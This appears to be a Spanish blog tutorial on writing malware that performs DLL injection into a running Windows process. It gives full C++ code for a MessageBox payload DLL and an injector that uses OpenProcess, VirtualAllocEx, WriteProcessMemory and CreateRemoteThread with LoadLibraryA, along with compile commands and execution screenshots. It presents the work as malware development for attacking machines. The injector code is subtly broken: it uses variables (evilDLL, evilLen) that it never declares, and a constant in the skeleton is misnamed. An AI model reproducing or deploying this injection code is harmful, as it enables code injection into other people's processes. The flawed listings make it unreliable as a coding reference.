---
title: Dll injection Injection en Windows
author: thespartoos
date: 2023-11-24 00:34:00 +0800
tags: [Malware Development]
categories: [Malware Development]
image:
  path: https://thespartoos.github.io/assets/img/favicons/DllInjection/portada.png
  alt: 
---


### ¿Qué es una DLL?

Una DLL (Dynamic-Link Library) es una biblioteca que contiene código y datos que pueden usar más de un programa al mismo tiempo. Esto es crucial debido a que las aplicaciones de windows reutilizan código, con lo cuál lo hace más eficiente.

![](https://thespartoos.github.io/assets/img/favicons/DllInjection/Dllmodules.png)


Al inyectar una DLL en un proceso que ya se está ejecutando, el malware puede obtener el mismo nivel de acceso y privilegios que el proceso mismo.

> Recuerdo que lo que se va a mostrar en este post no se trata de evadir el AV/EDR, eso lo veremos en los siguientes artículos.
{: .prompt-info }

### Para que sirve DLL injection

La DLL injection normalmente implica cargar una DLL en la memoria de un proceso de destino y luego llamar a una de sus funciones desde dentro del proceso.

Para ello se puede realizar de diversas formas, incluso manualmente modificando la memoria del proceso, utilizando herramientas de software de terceros o mediante un lenguaje de secuencias de comandos como PowerShell.

La DLL inyectada puede realizar diversas acciones, como robar datos confidenciales, registrar pulsaciones de teclas, realizar capturas de pantalla e instalar malware adicional. El malware también puede conectarse a funciones del sistema, como las utilizadas por el antivirus o el software de seguridad, para evadir la detección. Todo eso deberá de ser programado a través de la API de Windows o mediante syscall o indirect syscalls entre otras.

### Diferencia entre Programar para EXE y DLL

Existen diferencias entre programar malware en formato EXE y DLL. Una de las primeras diferencias que nos podemos encontrar a la hora de programar una DLL es el &nbsp;`main`&nbsp;. Cuando programamos para un EXE, tenemos una función llamada **main** que el cargador del sistema operativo llama. Por otro lado DLL cuando se desea ejecutar es diferente, por lo que el cargador crea un proceso en la memoria el cuál requiere de su DLL o cualquier otra. Las DLL utilizan la función &nbsp;`DLLMain`&nbsp;.

```c++
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACHED: // A process is loading the DLL.
        break;
        case DLL_THREAD_ATTACHED: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

Esta sería la estructura básica e inicial que debería tener una DLL. Información proporcionada por [**microsoft**](https://learn.microsoft.com/es-es/troubleshoot/windows-client/deployment/dynamic-link-library).


### Creación de la DLL

En este caso vamos a cargar una DLL la cual nos abra aparezca una ventana de mensaje con la API [**MessageBox**](https://learn.microsoft.com/es-es/windows/win32/api/winuser/nf-winuser-messagebox).

```c++
int MessageBox(
  [in, optional] HWND    hWnd,
  [in, optional] LPCTSTR lpText,
  [in, optional] LPCTSTR lpCaption,
  [in]           UINT    uType
);
```

- &nbsp;`HWND hWnd`&nbsp;: Identificador de la ventana propietario del cuadro de mensaje que se va a crear.

- &nbsp;`LPCTSTR lpText`&nbsp;: Mensaje que se va a mostrar.

- &nbsp;`LPCTSTR lpCaption`&nbsp;: Título del cuadro de diálogo.

- &nbsp;`UINT uType`&nbsp;: El contenido y el comportamiento del cuadro de diálogo
<br>
Así quedaría la estructura ya creada de la DLL que vamos a inyectar.

```c++
#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  nReason, LPVOID lpReserved) {
  switch (nReason) {
  case DLL_PROCESS_ATTACH:
    MessageBox(NULL, "Hola from maldev.dll !", "Thespartoos", MB_OK);
    break;
  case DLL_PROCESS_DETACH:
    break;
  case DLL_THREAD_ATTACH:
    break;
  case DLL_THREAD_DETACH:
    break;
  }
  return TRUE;
}
```

Sólo consta de &nbsp;`DllMain`&nbsp; cuál es la función principal de la biblioteca DLL. No declara ninguna función exportada, que es lo que normalmente hacen las DLL legítimas. &nbsp;`DllMain`&nbsp; el código se ejecuta justo después de cargar la DLL en la memoria del proceso.

### Creación del proyecto para DLL

#### Visual Studio

En el caso de que quieras realizar en Visual Studio la DLL deberemos de configurar una opción dentro del IDE. Lo primero es crear el proyecto en C++ y luego configurar la opción.

![](https://thespartoos.github.io/assets/img/favicons/DllInjection/changeDLL.png)

Lo que estamos haciendo es decirle al IDE que queremos compilar para una DLL y así cuando generemos nuestro código lo hará para DLL.

#### Linux

En linux puedes utilizar cualquier editor de código (&nbsp;`nvim`&nbsp;). Para compilarlo nos bastará con el siguiente comando.

```shell
x86_64-w64-mingw32-g++ -shared -o maldev.dll maldev.cpp -fpermissive
```

Una vez creada la dll deberemos de alojarla en la máquina que deseamos atacar en directorio que consideremos.

### Desarrollo del Dll injection

Una vez creada la DLL vamos a crear un nuevo buffer vacío de memoria de un tamaño de la longitud de la ruta de nuestra DLL desde el disco para posteriormente copiar la ruta a este buffer.

El primer paso será agregar la ruta de nuestra DLL desde el disco.

<div>
    <img src="https://thespartoos.github.io/assets/img/favicons/DllInjection/DllPath.png">
</div>

Lo siguiente que necesitaremos será obtener la dirección de memoria de LoadLibraryA ya que será llamada esa API a la hora de crear el hilo para que nos cargue la DLL.

Para ello primero cargaremos el modulo en donde de &nbsp;`kernel32.dll`&nbsp; que es en donde se encuentra la función de **LoadLibraryA**.

<div>
    <img src="https://thespartoos.github.io/assets/img/favicons/DllInjection/LoadLibraryA.png">
</div>


### Código Final

```c++
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

char maldevDLL[] = "C:\\maldev.dll";
unsigned int maldevLen = sizeof(maldevDLL) + 1;

int main(int argc, char* argv[]) {
  HANDLE ph; // process handle
  HANDLE rt; // remote thread
  LPVOID rb; // remote buffer

  HMODULE hKernel32 = GetModuleHandle("Kernel32");
  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");

  if ( atoi(argv[1]) == 0) {
      printf("PID no se ha encontrado\n");
      return -1;
  }
  printf("PID: %i", atoi(argv[1]));
  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
  
  rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
  
  WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);

  rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
  CloseHandle(ph);
  return 0;
}
```

Finalmente como podemos observar se estan empleando muchas funciones las cuales ya explicamos en el post [**anterior**](https://thespartoos.github.io/posts/Remote-Process-Injection/).

## Compilación

#### Microsoft Visual Studio

En este caso si deseamos compilar el malware desde Visual Studio deberemos de configurar una serie de opciones para que no de error otros equipos a la hora de ejecutar el malware, ya sean maquinas virtuales o equipos de escritorio.

##### Code Generation Visual Studio

![](https://thespartoos.github.io/assets/img/favicons/RPInjection/errorRuntime.png)

En este apartado lo que vamos a modificar es que a la hora de generar el código nos permita le deberemos de especificar &nbsp;`Multi-threaded Debug (/Mtd)`&nbsp; en caso de que deseemos el binario con una biblioteca de tiempo de ejecución que a su vez incluye información de depuración. Para la versión final del malware es recomendable utilizar &nbsp;`Multi-threaded (/MT)`&nbsp;.

![](https://thespartoos.github.io/assets/img/favicons/RPInjection/generationFix.png)

Al utilizarlo podremos compilar para cualquier equipo para Windows x64.

#### Desde un sistema Linux

Desde un sistema Linux

```shell
x86_64-w64-mingw32-gcc -O2 evil_inj.cpp -o inj.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null 2>&1
```

1. `x86_64-w64-mingw32-gcc`&nbsp; Es el compilador GCC (GNU Compiler Collection) configurado para generar código para la arquitectura x86_64 (64 bits) en el entorno Windows usando el conjunto de herramientas de Mingw-w64.
2. `-02`&nbsp; Aplica un conjunto más amplio de optimizaciones que pueden aumentar el rendimiento significativamente.
3. `-mconsole`&nbsp; Esta opción indica al compilador que el ejecutable resultante debe ser una aplicación de consola.
4. `-I`&nbsp; Directorio de inclusión donde el compilador buscará archivos de encabezado durante la compilación. 
5. `-s`&nbsp; Solicita al compilador que optimice el código resultante para reducir el tamaño del archivo ejecutable.
6. `-ffunction-sections`&nbsp; Indica al compilador que coloque cada función en una sección separada. Esto puede ayudar en la eliminación de código no utilizado durante la fase de enlace.
7. `-fdata-sections`&nbsp; Similar a la opción anterior, pero para variables y datos en lugar de funciones.
8. `-Wno-write-strings`&nbsp; Desactiva las advertencias relacionadas con la escritura en cadenas literales.
9. `-fno-exceptions`&nbsp; Indica al compilador que no genere código de manejo de excepciones.
10. `-fmerge-all-constants`&nbsp; Solicita al compilador que intente combinar constantes duplicadas.
11. `-static-libstdc++`&nbsp; Indica al enlazador que incluya la biblioteca estática de C++ estándar   
12. `-static-libgcc`&nbsp; Similar a la opción anterior, pero para la biblioteca GCC (compilador de C).
13. `-fpermissive`&nbsp; El compilador GCC puede aceptar y compilar código que podría violar ciertas reglas o normas del estándar C++.


### Ejecución

Antes que nada deberemos de dejar nuestra dll colocada en alguna ruta de nuestro disco, para este caso será &nbsp;`C:\`&nbsp;.

![](https://thespartoos.github.io/assets/img/favicons/DllInjection/dllColocar.png)

Una vez la dll este colocada en la ruta en donde especificamos en nuestro malware podremos efectuar la DLL Injection.

![](https://thespartoos.github.io/assets/img/favicons/DllInjection/ejecucion.png)

Ha sido todo un éxito.


### Analizamos el Funcionamiento

En esta parte vamos ha estar analizando que es lo que está ocurriendo por detrás en memoria a través de esta técnica. Lo primero será abrir nuestro Process Hacker y observar que DLL esta utilizando.

![](https://thespartoos.github.io/assets/img/favicons/DllInjection/dllInjected.png)

Podemos observar que la DLL fue correctamente cargada por nuestro programa. Ahora pasemos a ver la memoria de nuestro programa y ver el comportamiento respecto a nuestra DLL.

![](https://thespartoos.github.io/assets/img/favicons/DllInjection/memoryDll.png)

Tenemos diferentes direcciones que involucran a nuestra DLL y con diferentes permisos. En una de ellas se encuentra el texto claro que se encuentra en nuestra DLL y se puede ver en texto plano, porque está sin cifrar.

![](https://thespartoos.github.io/assets/img/favicons/DllInjection/textDll.png)


### Conclusión

![](https://thespartoos.github.io/assets/img/favicons/ProcessInjection/avDesactivado.png)

Este post no trata de evadir el AV/EDR, trata sobre malware development. En los próximos post estaré tratando temas relacionados con encriptar el shellcode con XOR y AES para evadir la detección estática.










